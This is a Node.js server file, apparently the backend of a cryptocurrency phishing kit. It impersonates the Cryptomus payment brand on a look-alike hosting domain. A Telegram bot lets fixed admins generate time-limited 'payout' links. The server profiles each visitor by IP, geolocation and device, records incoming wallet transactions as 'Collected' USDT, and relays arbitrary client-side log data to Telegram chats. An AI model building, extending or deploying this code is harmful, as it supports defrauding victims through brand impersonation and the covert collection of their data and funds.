require('dotenv').config();
const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ============ НАСТРОЙКА ДОМЕНА ============
// Укажите здесь ваш домен (уберите // в начале строки)
// const CUSTOM_DOMAIN = 'cryptomus.com';
const CUSTOM_DOMAIN = 'cryptomus.onrender.com';  // ← временный, пока не настроите свой

// Базовый URL для ссылок
const baseUrl = CUSTOM_DOMAIN 
    ? `https://${CUSTOM_DOMAIN}` 
    : (process.env.RENDER_EXTERNAL_URL || `http://localhost:${process.env.PORT || 3001}`);

// ============ TELEGRAM БОТ ============
const bot = new TelegramBot(process.env.BOT_TOKEN, { 
    polling: true,
    request: { timeout: 30000 }
});
console.log('🤖 Cryptomus Bot initialized');

// ============ TELEGRAM ADMIN PANEL ============
const ADMIN_IDS = ['7883109498', '8161483791'];

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = chatId.toString();
    
    if (!ADMIN_IDS.includes(userId)) {
        await bot.sendMessage(chatId, '❌ Access denied.');
        return;
    }
    
    await bot.sendMessage(chatId, `
🤖 *Cryptomus Admin Panel*

*Commands:*
/create [amount] [description] — create invoice
/stats — statistics
/help — help

*Example:*
/create 500 Test payout

🔗 Your site: ${baseUrl}
    `, { parse_mode: 'Markdown' });
});

bot.onText(/\/create (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = chatId.toString();
    
    if (!ADMIN_IDS.includes(userId)) return;
    
    const args = match[1].split(' ');
    const amount = args[0];
    const description = args.slice(1).join(' ') || 'Cryptomus payout';
    
    if (!amount || isNaN(amount)) {
        await bot.sendMessage(chatId, '❌ Use: /create 500 Test');
        return;
    }
    
    const invoiceId = uuidv4();
    const expiresAt = Date.now() + 30 * 60000;
    
    if (db) {
        await db.run(
            'INSERT INTO invoices (id, amount, description, created_at, expires_at, status) VALUES (?, ?, ?, ?, ?, ?)',
            [invoiceId, amount, description, Date.now(), expiresAt, 'pending']
        );
    }
    
    const paymentLink = `${baseUrl}/pay/${invoiceId}`;
    
    await bot.sendMessage(chatId, `
✅ *Invoice created!*

💰 Amount: ${amount} USDT
📝 Description: ${description}
🔗 ${paymentLink}
⏱️ Expires: 30 min
    `, { parse_mode: 'Markdown' });
    await bot.sendMessage(chatId, paymentLink);
});

bot.onText(/\/stats/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = chatId.toString();
    
    if (!ADMIN_IDS.includes(userId) || !db) return;
    
    const totalInvoices = await db.get('SELECT COUNT(*) as count FROM invoices');
    const totalVisitors = await db.get('SELECT COUNT(*) as count FROM visitors');
    const totalTransactions = await db.get('SELECT COUNT(*) as count FROM transactions');
    
    let totalAmount = 0;
    try {
        const sumResult = await db.get('SELECT SUM(amount) as total FROM transactions');
        totalAmount = sumResult?.total || 0;
    } catch (e) {}
    
    await bot.sendMessage(chatId, `
📊 *Cryptomus Statistics*

📄 Invoices: ${totalInvoices?.count || 0}
👥 Visitors: ${totalVisitors?.count || 0}
💸 Transactions: ${totalTransactions?.count || 0}
💰 Collected: ${totalAmount} USDT
    `, { parse_mode: 'Markdown' });
});

bot.onText(/\/help/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = chatId.toString();
    if (!ADMIN_IDS.includes(userId)) return;
    
    await bot.sendMessage(chatId, `
🤖 *Cryptomus Bot Commands*

/create [amount] [description] — create invoice
/stats — statistics
/help — this message
    `, { parse_mode: 'Markdown' });
});

bot.on('polling_error', (error) => {
    console.log('🔄 Polling error:', error.message);
});

// ============ ОТПРАВКА УВЕДОМЛЕНИЙ ============

async function sendTelegramAlert(text) {
    if (!text) return;
    
    const chatIds = process.env.CHAT_ID.split(',');
    
    for (const chatId of chatIds) {
        try {
            await bot.sendMessage(chatId.trim(), text, {
                parse_mode: 'HTML',
                disable_web_page_preview: true
            });
            console.log(`✅ Sent to ${chatId.trim()}`);
        } catch (error) {
            console.error(`❌ Failed to send to ${chatId.trim()}: ${error.message}`);
        }
    }
}

// ============ БАЗА ДАННЫХ ============

let db;
(async () => {
    try {
        db = await open({ filename: './database.sqlite', driver: sqlite3.Database });
        await db.exec(`
            CREATE TABLE IF NOT EXISTS invoices (
                id TEXT PRIMARY KEY, 
                amount DECIMAL, 
                description TEXT, 
                created_at INTEGER, 
                expires_at INTEGER, 
                status TEXT
            );
            CREATE TABLE IF NOT EXISTS visitors (
                id TEXT PRIMARY KEY, 
                invoice_id TEXT, 
                ip TEXT, 
                country TEXT, 
                city TEXT, 
                device TEXT, 
                first_seen INTEGER
            );
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                event_type TEXT,
                event_data TEXT,
                ip TEXT,
                timestamp INTEGER
            );
            CREATE TABLE IF NOT EXISTS transactions (
                txid TEXT PRIMARY KEY,
                invoice_id TEXT,
                from_address TEXT,
                amount DECIMAL,
                timestamp INTEGER
            );
        `);
        console.log('✅ Database connected');
        
        // ============ АВТО-СОЗДАНИЕ ТЕСТОВОГО ИНВОЙСА ============
        const existing = await db.get('SELECT COUNT(*) as count FROM invoices');
        if (existing.count === 0) {
            const testId = uuidv4();
            const expiresAt = Date.now() + 30 * 60000;
            await db.run(
                'INSERT INTO invoices (id, amount, description, created_at, expires_at, status) VALUES (?, ?, ?, ?, ?, ?)',
                [testId, '500', 'Cryptomus test payout', Date.now(), expiresAt, 'pending']
            );
            console.log('✅ Test invoice created:', testId);
            console.log(`🔗 ${baseUrl}/pay/${testId}`);
        }
        
    } catch (error) {
        console.error('❌ DB error:', error);
    }
})();

// ============ API ENDPOINTS ============

// Создание инвойса
app.post('/api/create-invoice', async (req, res) => {
    const { amount, description, expiryMinutes = 30 } = req.body;
    const invoiceId = uuidv4();
    const expiresAt = Date.now() + expiryMinutes * 60000;
    if (db) {
        await db.run(
            'INSERT INTO invoices (id, amount, description, created_at, expires_at, status) VALUES (?, ?, ?, ?, ?, ?)',
            [invoiceId, amount, description, Date.now(), expiresAt, 'pending']
        );
    }
    res.json({ 
        invoiceId, 
        paymentLink: `${baseUrl}/pay/${invoiceId}` 
    });
});

// Получение инвойса
app.get('/api/invoice/:id', async (req, res) => {
    if (!db) return res.json({ error: 'DB not ready' });
    const invoice = await db.get('SELECT * FROM invoices WHERE id = ?', req.params.id);
    if (invoice && Date.now() > invoice.expires_at) {
        invoice.status = 'expired';
        await db.run('UPDATE invoices SET status = ? WHERE id = ?', ['expired', req.params.id]);
    }
    res.json(invoice || { error: 'Invoice not found' });
});

// Логирование
app.post('/api/log', async (req, res) => {
    const data = req.body;
    console.log('📥 Log:', data.type);
    
    if (db) {
        try {
            await db.run(
                'INSERT INTO logs (event_type, event_data, ip, timestamp) VALUES (?, ?, ?, ?)',
                [data.type, JSON.stringify(data), req.ip, Date.now()]
            );
        } catch (dbError) {
            console.error('DB error:', dbError);
        }
    }
    
    if (data.telegram) {
        await sendTelegramAlert(data.telegram);
    }
    
    res.json({ success: true });
});

// Геолокация
app.get('/api/geo/:ip', async (req, res) => {
    try {
        const response = await axios.get(`http://ip-api.com/json/${req.params.ip}`);
        res.json({ 
            country: response.data.country, 
            city: response.data.city, 
            countryCode: response.data.countryCode
        });
    } catch (error) {
        res.json({ country: 'Unknown', city: 'Unknown', countryCode: '' });
    }
});

// Страницы
app.get('/admin', (req, res) => {
    res.sendFile(__dirname + '/public/admin.html');
});

app.get('/pay/:invoiceId', (req, res) => {
    res.sendFile(__dirname + '/public/pay.html');
});

// ============ ЗАПУСК СЕРВЕРА ============
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log(`🚀 Cryptomus Server: ${baseUrl}`);
    console.log(`📊 Admin panel: ${baseUrl}/admin`);
    console.log(`👥 Telegram recipients: ${process.env.CHAT_ID}`);
    console.log(`✅ Ready for payouts`);
});
